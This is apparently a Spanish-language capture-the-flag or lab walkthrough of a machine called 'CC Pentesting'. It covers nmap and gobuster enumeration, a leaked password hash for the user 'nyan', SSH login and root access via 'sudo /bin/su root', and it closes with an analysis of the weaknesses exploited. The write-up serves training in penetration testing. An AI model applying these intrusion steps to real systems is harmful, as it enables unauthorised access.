# CC Pentesting
## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enum
### HTTP
#### Gobuster
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/secret (Status: 301) <-- Vacio y no listable
/server-status (Status: 403)
```
#### Gobuster 2
```
/secret.txt (Status: 200) <- Aquí hay unas creds
```
Sacamos las creds y crackeamos el hash
```
nyan:046385855FC9580393853D8E81F240B66FE9A7B8
```
Una vez crackeado el hash entramos via ssh

## Privesc
```
User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
```
Privesc bastante sencillo 
```
sudo /bin/su root
```
Y ya estamos dentro

# Analisís de la intrusión
### Sensible information leak
Se han filtrado las credenciales de un usuario en un lugar accesible al público lo que nos permitio acceder
### Bad password policie
Las contraseña de nyan esta en las principales wordlists, lo que nos prmitio crackearlas con mucha rapidez
### Privileged su execution
El binario su puede ser ejecutado como superusuario por el usuario nyan como superusaurio lo que nos condujo a elevar privilegios en el sistema
